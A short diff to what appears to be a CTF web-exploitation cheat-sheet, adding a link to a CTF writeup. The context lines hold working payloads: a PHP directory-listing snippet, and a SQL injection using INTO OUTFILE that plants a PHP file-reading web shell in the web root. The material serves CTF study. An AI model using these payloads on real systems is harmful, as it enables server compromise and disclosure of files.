@@ -25,6 +25,8 @@ echo readfile('/var/log/faillog'); // Reads file
 - `<?php $t = new RecursiveDirectoryIterator("/var/www/html");foreach(new RecursiveIteratorIterator($t) as $file =>$key) { echo $file."<br/>"; } ?>` : Iterating the directory
 - `' UNION SELECT null,'04-01-2099', '<?php show_source($_GET["file"]); ?>' into outfile '/var/www/html/kaospilot1.php' #` : Uploading a php script
 
+## Important CTF Writeups
+- [Web Flag Vault](https://github.com/thorleifjacobsen/ctf/tree/master/1753ctf-2024/web-flag-vault)
 
 ## Common tools¶
 
